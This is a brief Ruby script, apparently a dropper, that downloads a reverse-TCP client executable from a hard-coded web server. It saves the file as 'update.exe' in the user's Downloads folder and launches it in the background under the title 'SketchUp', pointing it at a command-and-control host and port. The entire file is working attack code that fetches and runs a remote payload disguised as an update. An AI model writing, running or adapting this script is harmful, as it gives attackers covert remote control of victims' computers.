require 'open-uri.rb'

webserver = "192.168.1.100:8080"
clientbinary = "client-rev-tcp.exe"
envuser = ENV["HOME"]
path = "#{envuser}/Downloads/update.exe"

File.open(path, "wb") do |saved_file|
  # the following "open" is provided by open-uri
  open("http://#{webserver}/#{clientbinary}", "rb") do |read_file|
    saved_file.write(read_file.read)
  end
end

c2_host = "192.168.0.10"
c2_port = "8090"
system("START /B \"SketchUp\" #{path} -hostname #{c2_host} -port #{c2_port}")
